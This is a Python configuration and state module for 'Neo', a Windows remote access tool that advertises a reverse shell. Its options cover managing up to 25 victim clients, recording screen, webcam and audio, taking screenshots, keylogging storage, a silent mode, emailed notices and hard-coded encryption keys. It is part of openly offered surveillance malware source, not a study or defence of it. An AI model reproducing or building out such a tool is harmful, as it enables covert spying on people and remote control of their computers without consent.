from binary.encrypt_data import *


state = {
  'name': 'Neo',
  'description': 'A Windows remote access tool application supporting\n'
                + 'a whide range of powerful & easy to use commands\n'
                + 'along with a stable reverse shell. [USE: \'HELP\']',
  'author': 'Authors Github: https://github.com/Alvin-22',
  'settings': {
    'dynamic': {
      'is-loading': False,
      'alias-size': None,
      'alias-data': None,
      'queue': []
    },
    'debug': False,
    'safe-timeout': 60,
    'keep-alive-count': 60,
    'max-file-size': 75,
    'loading': True,
    'loading-animation': True,
    'encoding': 'latin-1',
    'headersize': 10,
    'io-channels': [None, None],
    'encryption': Encryption(
                  'ksxgyRuBRJLKxjFeHD4nmxbE',
                  b'v4CuHZFzmTedBY2EBGrLRXsm'),
    'folders': {
      'parent': 'Resources',
      'child': ('Files',
                'Scripts',
                'Haarcascades',
                'Keystroke')
    }
  },
  'session': {
    'active': False,
    'socket': None,
    'username': None,
    'data': None
  },
  'sockets': {
    'server': None,
    'clients': [[], [], []],
    'modules': {
      'stream': [None, []],
      'cam': [None, []],
      'audio': [None, []],
      'talk': [None, []]
    }
  },
  'options': {
    'mode': {
      'safe': False,
      'silent': False,
    },
    'validation': {
      'duplicates': True,
      'max-clients': 25
    },
    'information-gathering': {
      'history': True,
      'whoami': True,
      'record': {
        'stream': True,
        'cam-stream': True,
        'audio': True,
        'talk': True
      },
      'save': {
        'screenshot': True,
        'cam-screenshot': True
      },
      'backup': {
        'text': False,
        'image': False
      }
    },
    'notice': {
      'email-notice': False,
      'email-data': {
        'email': None,
        'password': None,
        'to': None
      }
    }
  }
}